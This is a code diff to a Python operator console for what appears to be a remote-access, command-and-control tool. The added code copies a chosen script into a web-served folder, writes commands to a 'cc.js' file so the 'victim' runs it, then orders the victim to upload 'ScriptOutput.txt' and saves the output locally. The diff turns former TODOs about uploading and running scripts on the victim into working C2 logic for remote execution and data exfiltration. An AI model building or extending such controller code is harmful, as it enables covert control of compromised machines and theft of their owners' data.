@@ -28,6 +28,7 @@
 ## TODO: Have a 'snapshot'.. where it enumerates the host and sends it back 
 ## TODO: Performs searches ?
 ## TODO: Run custom scripts from ./Scripts/
+## TODO: Better user input functions.. if/else not sustainable
 ## COMPLETE: Add Local Command capability
 
 
@@ -233,59 +234,94 @@ def mainLoopFunc():
 
             #print("Below are the items")
             for list in scripts:
-                print("Choose: " + str(scripts.index(list)+1) + " for " + list)
+                print("[+] Choose: " + str(scripts.index(list)+1) + " for " + list)
 
             #print("There are a total of " + str(totalScripts))
             
             while True:
                 try:
-                    user_input = int(raw_input("[!] Choose the Script # or '0' to quit\n"))
+                    user_input2 = int(raw_input("[+] Choose the Script # or '0' to quit\n"))
                 except ValueError:
-                    print("That's not a number!")
+                    print("[-] That's not a number!")
                 else:
-                    if 1 <= user_input <= int(totalScripts):
+                    if 1 <= user_input2 <= int(totalScripts):
 
-                        second_input = str(raw_input("Are you sure?? 'yes' or 'no'\n"))
+                        second_input = str(raw_input("[!] Are you sure?? 'yes' or 'no'\n"))
                         if second_input == 'no':
-                            print("Good catch, leaving..")
+                            print("[*] Good catch, leaving..")
                             break
                         elif second_input == 'yes':
-                            print("Good job!")
-                            print("TODO: STILL WORKING ON THIS")
-                            ''' The below works
-                            new = ((user_input) -1)
+                            #print("Good job!")
+                            #print("TODO: STILL WORKING ON THIS")
+                            #The below works
+                            new = (int(user_input2) -1)
                             choice = str(scripts[new])
-                            print("You chose script: " + choice)
-                            print("Let's move that to ./Files/")
-                            shutil.copy('./Scripts/' + choice, '.')
-                            print("File is now in ./Files/")
-                            '''
-                            #####################
-                            ### TODO: Upload Script to victim
-                            ### TODO: RUN SCRIPT
-                            ### TODO: SAVE OUTPUT OF SCRIPT TO local
-                            ### TODO: GRAB FILE (Delete from local)
-                            ### TODO: REMOVE FROM ./Files/
-                            ##################### 
+                            print("[*] You chose script: " + choice)
+                            #print("Let's move that to ./WebOnly/")
+                            shutil.copy('./Scripts/' + choice, './WebOnly/' + choice)
+                            #print("File is now in ./WebOnly/")
+                            
+                            # Write command to cc
+                            f = open (cc, 'w')
+                            f.write(str(user_input) + '\n')
+                            f.write(str(choice) + '\n')
+                            f.close()
+                            
+                            # SCRIPT IS NOW DEPLOYED.. 30 sec minimum wait
+                            print("[*] Script has been deployed...")
+                            # Just wait a bit
+                            time.sleep(5)
+                            print("[*] Script is now running on victim...")
+                            time.sleep(5)
+                            #print("[!] Script is being processed...")
+                            time.sleep(10)
+                            print("[*] Output it being uploaded...")
+                            
+                            # Update cc.js with 'download from victim' command..
+                            f = open(cc,'w')
+                            f.write('2\n')
+                            f.write('ScriptOutput.txt\n')
+                            f.close()
+                            
+                            time.sleep(10)
+                            print("[*] Waiting for results...")
+                            time.sleep(10)
+
+
+                            # Rename file to script name with timestamp
+                            os.rename('./WebOnly/FILENAME', './Files/' + choice[:-4] + time.strftime("%Y%m%d-%H%M%S") + ".txt")
+                            time.sleep(2)
+                            
+                            # Print completion
+                            print('[*] ' + choice + " has been completed and results have been saved to:\n " + pwd + '/Files/' + choice[:-4] + time.strftime("%Y%m%d-%H%M%S") + ".txt")                        
+
                             break
 
                         else:
-                            print("Choose 'yes' or 'no'")
+                            print("[!] Choose 'yes' or 'no'")
                             continue
                     elif user_input == 0:
-                        print("Okay we leave, goodbye")
+                        print("[-] Okay we leave, goodbye")
                         break
                     else:
-                        print("Out of Range, try again!")
+                        print("[-] Out of Range, try again!")
                         continue
                 
-
+        ####
+        ## Q TO QUIT
+        ####
         elif user_input is 'q':
             #print("QUIT")
             break
+        ####
+        ## Q TO QUIT
+        ####
         elif user_input is 'Q':
             #print("QUIT")
             break
+        ####
+        ## START OVER
+        ####
         else:
             print("[-] Invalid command.. let's start over")
             continue
